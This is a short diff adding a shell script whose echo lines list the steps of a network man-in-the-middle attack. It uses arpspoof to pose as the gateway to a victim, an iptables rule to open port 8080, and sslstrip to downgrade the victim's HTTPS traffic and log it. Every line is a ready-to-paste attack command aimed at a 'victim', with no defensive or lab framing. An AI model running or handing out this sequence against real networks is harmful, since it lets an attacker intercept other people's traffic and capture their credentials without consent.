@@ -1,0 +1,5 @@
+echo "arpspoof -i wlp3s0 -t [gateway's IP] -r [victim's IP], trick victim into believing that my Linux's MAC is correspond to Gateway's IP"
+
+echo "iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT, open port 8080 on my PC"
+
+echo "sslstrip -l 8080, start sslstrip on port 8080, and use tail -f sslstrip.log to view the logs"
